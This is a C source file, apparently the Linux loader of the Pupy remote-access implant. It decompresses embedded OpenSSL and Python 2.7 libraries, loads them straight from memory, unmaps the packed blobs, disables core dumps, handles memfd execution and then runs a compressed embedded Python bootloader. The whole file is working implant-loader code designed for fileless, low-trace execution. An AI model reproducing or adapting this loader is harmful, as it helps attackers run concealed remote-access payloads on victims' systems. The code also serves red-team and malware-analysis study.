/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#define _GNU_SOURCE
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <limits.h>
#include <string.h>
#include <pthread.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include "pupy_load.h"
#include "Python-dynload.h"

#include "_memimporter.h"
#include "tmplibrary.h"
#include "debug.h"

#include "bootloader.c"
#include "python27.c"
#include "libssl.c"
#include "libcrypto.c"

#include "revision.h"

extern DL_EXPORT(void) init_memimporter(void);
extern DL_EXPORT(void) initpupy(void);

// Simple trick to get the current pupy arch
#ifdef __x86_64__
    const uint32_t dwPupyArch = 64;
#else
    const uint32_t dwPupyArch = 32;
#endif

#include "lzmaunpack.c"

static inline void* xz_dynload(const char *soname, const char *xzbuf, size_t xzsize) {
    void *uncompressed = NULL;
    size_t uncompressed_size = 0;

    uncompressed = lzmaunpack(xzbuf, xzsize, &uncompressed_size);

    if (!uncompressed) {
        dprint("%s decompression failed\n", soname);
        abort();
    }

    void *res = memdlopen(soname, (char *) uncompressed, uncompressed_size);

    lzmafree(uncompressed, uncompressed_size);

    if (!res) {
        dprint("loading %s from memory failed\n", soname);
        abort();
    }

    return res;
}

uint32_t mainThread(int argc, char *argv[], bool so) {

    int rc = 0;
    PyObject *m=NULL, *d=NULL, *seq=NULL;
    PyGILState_STATE restore_state;

    struct rlimit lim;

    dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);

    if (getrlimit(RLIMIT_NOFILE, &lim) == 0) {
        lim.rlim_cur = lim.rlim_max;
        setrlimit(RLIMIT_NOFILE, &lim);
    }

    lim.rlim_cur = 0; lim.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &lim);

    xz_dynload("libcrypto.so.1.0.0", libcrypto_c_start, libcrypto_c_size);
    xz_dynload("libssl.so.1.0.0", libssl_c_start, libssl_c_size);

    if(!Py_IsInitialized) {
        _load_python(
            xz_dynload("libpython2.7.so.1.0", python27_c_start, python27_c_size)
        );
    }

    munmap((char *) libcrypto_c_start, libcrypto_c_size);
    munmap((char *) libssl_c_start, libssl_c_size);
    munmap((char *) python27_c_start, python27_c_size);

    dprint("calling PyEval_InitThreads() ...\n");
    PyEval_InitThreads();
    dprint("PyEval_InitThreads() called\n");

    char exe[PATH_MAX] = { '\0' };

    if(!Py_IsInitialized()) {
        dprint("Py_IsInitialized\n");

        Py_FileSystemDefaultEncoding = "utf-8";
        Py_IgnoreEnvironmentFlag = 1;
        Py_NoSiteFlag = 1; /* remove site.py auto import */
        Py_NoUserSiteDirectory = 1;
        Py_OptimizeFlag = 2;
        Py_DontWriteBytecodeFlag = 1;

#if defined(Linux)
        dprint("INVOCATION NAME: %s\n", program_invocation_name);

        if (readlink("/proc/self/exe", exe, sizeof(exe)) > 0) {
            if (strstr(exe, "/memfd:")) {
                snprintf(exe, sizeof(exe), "/proc/%d/exe", getpid());
            }
        } else {
            char *upx_env = getenv("   ");
            if (upx_env) {
                snprintf(exe, sizeof(exe), "%s", upx_env);
            }
        }

#elif defined(SunOS)
        strcpy(exe, getexecname());
#endif
        Py_SetProgramName(exe);

        dprint("Initializing python.. (%p)\n", Py_Initialize);
        Py_InitializeEx(0);

        dprint("SET ARGV\n");
        if (argc > 0) {
            if (so) {
                if (argc > 2 && !strcmp(argv[1], "--pass-args")) {
                    argv[1] = argv[0];
                    PySys_SetArgvEx(argc - 1, argv + 1, 0);
                } else {
                    PySys_SetArgvEx(1, argv, 0);
                }
            } else {
                PySys_SetArgvEx(argc, argv, 0);
            }
        }

        PySys_SetPath("");
#ifndef DEBUG
        PySys_SetObject("frozen", PyBool_FromLong(1));
#endif
        PySys_SetObject("executable", PyString_FromString(exe));
        dprint("Py_Initialize() complete\n");
    }
    restore_state=PyGILState_Ensure();

    init_memimporter();
    dprint("init_memimporter()\n");
    initpupy();
    dprint("initpupy()\n");

    /* We execute then in the context of '__main__' */
    dprint("starting evaluating python code ...\n");
    m = PyImport_AddModule("__main__");
    if (m) d = PyModule_GetDict(m);
    if (d) seq = PyObject_lzmaunpack(
        bootloader_c_start,
        bootloader_c_size
    );

    munmap((char *) bootloader_c_start, bootloader_c_size);

    if (seq) {
        PyObject *discard = PyEval_EvalCode((PyCodeObject *)seq, d, d);
        dprint("EVAL CODE %p -> %p\n", seq, discard);
        if (!discard) {
            PyErr_Print();
            rc = 255;
        }
        Py_XDECREF(discard);
    }
    Py_XDECREF(seq);

    dprint("complete ...\n");
    PyGILState_Release(restore_state);
    Py_Finalize();
    dprint("exit ...\n");
    return rc;
}
